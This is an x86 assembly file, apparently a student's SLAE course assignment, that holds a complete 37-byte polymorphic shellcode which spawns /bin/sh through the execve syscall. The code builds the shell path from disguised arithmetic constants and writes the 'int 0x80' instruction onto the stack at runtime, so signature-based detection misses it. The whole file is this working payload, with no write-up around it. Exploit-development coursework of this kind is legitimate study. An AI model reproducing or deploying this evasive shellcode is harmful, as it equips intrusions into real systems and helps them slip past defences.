; Author :      Demey Alexandre (PA-14186)
; Date :        11-05-2020
; 
; Description : SLAE assignment #6 - Polymorphic shellcodes
;
; Size : 37 bytes


global _start
section .text

_start:

    xor edi, edi
    mul edi             ; set EAX,EDX,EDI to 0
    push edi            ; push string terminator
    sub eax, 0x978CD092 ; EAX => 0x68732f6e
    push eax            ; push hs/n
    sub edi, 0x969DD0D1 ; EDI => 0x69622f2f
    push edi            ; push ib//
    lea ebx, [esp]      ; EBX pointer to //bin/sh
    mov ecx, edx        ; ECX set to null pointer
    add eax, 0x978CD09D ; EAX => 0xb execve syscall number
    sub dx, 0x7F33      ; EDX set to 0x80cd
    push edx            ; push int 0x80 opcode
    push esp
    cdq                 ; EDX set to 0x00
    ret                 ; go to "int 0x80" address
